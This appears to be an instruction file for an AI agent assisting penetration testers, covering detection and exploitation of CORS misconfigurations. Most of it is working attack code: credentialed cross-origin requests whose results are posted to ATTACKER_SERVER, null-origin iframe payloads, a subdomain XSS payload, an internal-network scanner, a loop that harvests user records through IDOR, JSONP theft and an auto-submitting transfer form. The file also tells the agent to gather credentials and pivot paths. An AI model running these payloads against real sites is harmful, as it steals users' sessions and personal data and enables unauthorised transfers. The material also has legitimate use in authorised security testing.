---
name: cors-misconfiguration
description: >
  Exploit CORS (Cross-Origin Resource Sharing) misconfigurations during
  authorized penetration testing.
keywords:
  - cors
  - cors misconfiguration
  - cors bypass
  - cross-origin
  - origin reflection
  - null origin
  - access control allow origin
  - cors wildcard
  - cors credentials
  - cross-origin data theft
  - cors exploitation
  - sop bypass
tools:
  - burpsuite
  - curl
  - corsy
  - CORScanner
opsec: low
---

# CORS Misconfiguration

You are helping a penetration tester exploit Cross-Origin Resource Sharing
misconfigurations. The target application sets CORS headers that allow
unauthorized origins to read cross-origin responses, potentially enabling
credential theft, session hijacking, and sensitive data exfiltration. The goal
is to demonstrate that an attacker-controlled origin can read authenticated
responses from the target. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[cors-misconfiguration] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Target endpoint that returns data you want to steal cross-origin
  (user profile, API keys, session info, PII)
- The endpoint must use cookie-based or automatic authentication
  (CORS credential theft doesn't work with manual `Authorization` headers
  added by JavaScript — those require the attacker's JS to already have the token)
- A domain you control for hosting PoC pages (or use Burp Collaborator)

## Step 1: Assess

Test the target's CORS configuration by sending requests with various Origin
headers. The critical combination is `Access-Control-Allow-Origin` set to an
attacker-controllable value **plus** `Access-Control-Allow-Credentials: true`.

### Quick Detection

```bash
# Test with an arbitrary attacker origin
curl -sI -H "Origin: https://evil.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"

# Test with null origin
curl -sI -H "Origin: null" \
  "https://TARGET/api/endpoint" | grep -i "access-control"

# Test with a subdomain variant
curl -sI -H "Origin: https://sub.TARGET" \
  "https://TARGET/api/endpoint" | grep -i "access-control"
```

### Systematic Header Analysis

```bash
# Full CORS header scan across multiple origin patterns
ORIGINS=(
  "https://evil.com"
  "null"
  "https://TARGET.evil.com"
  "https://evil.TARGET"
  "https://TARGETevil.com"
  "https://evil-TARGET"
  "https://sub.TARGET"
  "https://TARGET_evil.com"
  "https://TARGET%60evil.com"
)

for origin in "${ORIGINS[@]}"; do
  echo "=== Origin: $origin ==="
  curl -sI -H "Origin: $origin" \
    -H "Cookie: session=VALID_SESSION" \
    "https://TARGET/api/sensitive" 2>/dev/null | \
    grep -i "access-control"
  echo
done
```

### What to Look For

| Response Headers | Severity | Exploitable? |
|-----------------|----------|-------------|
| `ACAO: https://evil.com` + `ACAC: true` | **Critical** | Yes — full credential theft |
| `ACAO: null` + `ACAC: true` | **High** | Yes — via sandboxed iframe |
| `ACAO: *` (no credentials) | **Medium** | Only if endpoint has sensitive data without auth |
| `ACAO: *` + `ACAC: true` | **Invalid** | Browsers reject this combination |
| `ACAO: https://sub.TARGET` + `ACAC: true` | **Medium** | Requires XSS on trusted subdomain |
| No CORS headers | **None** | Not exploitable via CORS |

ACAO = `Access-Control-Allow-Origin`, ACAC = `Access-Control-Allow-Credentials`

## Step 2: Origin Reflection

The most common and critical misconfiguration — the server reflects the
`Origin` header directly into `Access-Control-Allow-Origin`.

### Confirm

```bash
curl -sI -H "Origin: https://attacker-controlled.com" \
  -H "Cookie: session=VALID_SESSION" \
  "https://TARGET/api/user/profile"

# Vulnerable if response includes:
# Access-Control-Allow-Origin: https://attacker-controlled.com
# Access-Control-Allow-Credentials: true
```

### Exploit — Data Exfiltration PoC

Host this on your attacker-controlled domain:

```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS PoC — Origin Reflection</h1>
<div id="result"></div>
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() {
  // Display stolen data
  document.getElementById('result').innerText = this.responseText;

  // Exfiltrate to attacker server
  fetch('https://ATTACKER_SERVER/exfil', {
    method: 'POST',
    body: this.responseText
  });
};
xhr.open('GET', 'https://TARGET/api/user/profile', true);
xhr.withCredentials = true;  // Send victim's cookies
xhr.send();
</script>
</body>
</html>
```

### Exploit — Fetch API Variant

```javascript
fetch('https://TARGET/api/user/profile', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  // Exfiltrate
  navigator.sendBeacon('https://ATTACKER_SERVER/exfil', data);
});
```

## Step 3: Null Origin

The application whitelists `null` as a trusted origin. The `null` origin is
sent by sandboxed iframes, `data:` URIs, and local file access.

### Confirm

```bash
curl -sI -H "Origin: null" \
  -H "Cookie: session=VALID_SESSION" \
  "https://TARGET/api/user/profile"

# Vulnerable if response includes:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

### Exploit — Sandboxed Iframe with Data URI

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      // Exfiltrate stolen data
      location = 'https://ATTACKER_SERVER/exfil?data='
        %2B encodeURIComponent(this.responseText);
    };
    xhr.open('GET', 'https://TARGET/api/user/profile', true);
    xhr.withCredentials = true;
    xhr.send();
  </script>">
</iframe>
```

### Exploit — Srcdoc Variant

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    fetch('https://TARGET/api/user/profile', {credentials: 'include'})
    .then(r => r.text())
    .then(data => {
      fetch('https://ATTACKER_SERVER/exfil', {
        method: 'POST',
        body: data
      });
    });
  </script>">
</iframe>
```

## Step 4: Regex Bypass

When the server validates the Origin header with a regex, common implementation
mistakes allow bypass.

### Unescaped Dot

Server regex: `^https://api.example.com$` — dot matches any character.

```bash
# Register: apiXexample.com (any char replaces the dot)
curl -sI -H "Origin: https://apiXexample.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"
```

### Missing End Anchor

Server regex: `^https://example.com` — no `$` anchor.

```bash
# Any domain starting with example.com passes
curl -sI -H "Origin: https://example.com.evil.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"
```

### Missing Start Anchor

Server regex: `example.com$` — no `^` anchor.

```bash
# Any domain ending with example.com passes
curl -sI -H "Origin: https://evilexample.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"
```

### Suffix Matching Without Dot

Server checks: origin ends with `trusted.com` (not `.trusted.com`).

```bash
curl -sI -H "Origin: https://nottrusted.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"
```

### Special Character Bypass

```bash
# Underscore (Chrome/Firefox accept in origin)
curl -sI -H "Origin: https://target_evil.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"

# Backtick (Safari edge case)
curl -sI -H "Origin: https://target\`evil.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"

# Curly brace (Safari)
curl -sI -H "Origin: https://target}.evil.com" \
  "https://TARGET/api/endpoint" | grep -i "access-control"
```

### Exploitation for Any Regex Bypass

Once you find an origin that passes validation, host the exfiltration PoC
(from Step 2) on that domain.

## Step 5: Subdomain Trust

The server trusts all subdomains: `*.target.com`. Exploitable if you can find
XSS on any subdomain.

### Confirm Subdomain Trust

```bash
curl -sI -H "Origin: https://anything.TARGET" \
  "https://TARGET/api/user/profile" | grep -i "access-control"

# Also check for wildcard
curl -sI -H "Origin: https://evil.sub.TARGET" \
  "https://TARGET/api/user/profile" | grep -i "access-control"
```

### Exploit via Subdomain XSS

If XSS exists on `blog.target.com` (or any other subdomain):

```
https://blog.target.com/post?q=<script>
fetch('https://api.target.com/user/profile',{credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://ATTACKER_SERVER/exfil',{method:'POST',body:d}))
</script>
```

The XSS payload on the trusted subdomain makes a credentialed request to the
API, which trusts the subdomain origin and returns data with CORS headers.

### Subdomain Takeover + CORS

If a subdomain has a dangling DNS record (CNAME to unclaimed service), take it
over and host the CORS exploitation PoC there. The API will trust the
subdomain origin.

## Step 6: Wildcard Without Credentials

`Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true`.

### Impact Assessment

- Browsers do **not** send cookies with wildcard CORS
- Only exploitable if the endpoint returns sensitive data **without
  authentication** (public API with internal data, unauthenticated admin panel)
- Useful for internal network pivoting — public website reads from internal
  services that use wildcard CORS

### Exploit — Internal Network Pivot

If the victim visits an attacker page while on the internal network:

```javascript
// Scan internal services accessible via wildcard CORS
const targets = [
  'http://192.168.1.1/admin',
  'http://10.0.0.5:8080/api/status',
  'http://localhost:3000/debug',
  'http://jenkins.internal:8080/api/json',
  'http://grafana.internal:3000/api/org'
];

targets.forEach(url => {
  fetch(url)
    .then(r => r.text())
    .then(data => {
      if (data.length > 0) {
        fetch('https://ATTACKER_SERVER/internal', {
          method: 'POST',
          body: JSON.stringify({url: url, data: data})
        });
      }
    })
    .catch(() => {});
});
```

## Step 7: Advanced Techniques

### CORS + Cache Poisoning

If the server reflects Origin in the response and the response is cached
without `Vary: Origin`:

```bash
# Check for missing Vary header
curl -sI -H "Origin: https://evil.com" \
  "https://TARGET/page" | grep -i "vary"

# If Vary: Origin is missing, the cached response may include:
# Access-Control-Allow-Origin: https://evil.com
# Subsequent users get this cached response, enabling cross-origin reads
```

### CORS + IDOR Chain

CORS misconfiguration combined with IDOR enables mass cross-origin data
exfiltration:

```javascript
// CORS allows reading responses, IDOR allows accessing any user's data
async function exfilAll() {
  for (let id = 1; id <= 1000; id++) {
    try {
      const r = await fetch(`https://TARGET/api/users/${id}`, {
        credentials: 'include'
      });
      if (r.ok) {
        const data = await r.json();
        await fetch('https://ATTACKER_SERVER/exfil', {
          method: 'POST',
          body: JSON.stringify({id: id, data: data})
        });
      }
    } catch(e) {}
    await new Promise(r => setTimeout(r, 100)); // rate limit
  }
}
exfilAll();
```

### XSSI / JSONP Bypass

`<script>` tags are not subject to CORS (SOP doesn't restrict script loading).
If the target has JSONP endpoints, CORS is irrelevant:

```html
<script>
// Override the callback function to steal data
function jsonpCallback(data) {
  fetch('https://ATTACKER_SERVER/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}
</script>
<!-- Browser loads script cross-origin, executes callback with data -->
<script src="https://TARGET/api/user?callback=jsonpCallback"></script>
```

### Preflight Bypass

Simple requests (GET, POST with standard Content-Type) don't trigger preflight
OPTIONS checks. The server processes the request — CORS only controls whether
the browser lets JavaScript read the response.

```html
<!-- This POST will be SENT (server processes it) even without CORS headers.
     The browser just prevents reading the response.
     Useful for blind CSRF-style attacks where you don't need the response. -->
<form action="https://TARGET/api/transfer" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

## Step 8: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## OPSEC Notes

- CORS testing with curl is invisible to the target beyond normal HTTP requests
- Hosting PoC pages requires your own domain or Burp Collaborator
- The actual exploitation requires the victim to visit your attacker page —
  no server-side artifacts beyond the credentialed request
- High-volume CORS + IDOR enumeration (many requests through victim's browser)
  may trigger rate limiting or anomaly detection
- `Vary: Origin` absence makes cache poisoning possible but also means your
  test may affect cached responses for other users — test carefully

## Troubleshooting

### No CORS Headers in Response

- The endpoint may not have CORS configured at all (not exploitable via CORS)
- Try adding `Access-Control-Request-Method: GET` header to trigger CORS
- Try a preflight request: `curl -X OPTIONS -H "Origin: ..." TARGET`
- Check if CORS is only enabled on specific endpoints (API vs static pages)
- Look for JSONP as an alternative cross-origin data access method

### Origin Reflected but No Credentials Header

Without `Access-Control-Allow-Credentials: true`, the browser won't send
cookies. Impact is limited to:
- Reading responses that don't require authentication
- Internal network pivoting (if endpoint has wildcard and serves sensitive
  data without auth)

### PoC Works in curl but Not in Browser

- Check for Content Security Policy that blocks inline scripts or connections
  to your exfiltration server
- Verify `SameSite` cookie attribute — `SameSite=Strict` or `Lax` may prevent
  cookie transmission on cross-origin requests from `<script>` (Lax allows
  top-level navigations)
- Test in a private/incognito window to avoid extension interference
- Use `SameSite=None; Secure` test cookies if possible

### Preflight (OPTIONS) Request Fails

- The server may allow simple requests but reject preflight for custom headers
- Restructure the exploit to use only simple request methods and headers
  (GET, POST with `Content-Type: application/x-www-form-urlencoded`)
- If the exploit needs custom headers (e.g., `Authorization`), CORS preflight
  is required and must pass

### Rate Limiting on Exfiltration Requests

- Add delays between requests in the PoC
- Use `navigator.sendBeacon()` for single-shot exfiltration (more reliable
  than fetch for page unload scenarios)
- Batch data and exfiltrate in fewer, larger requests
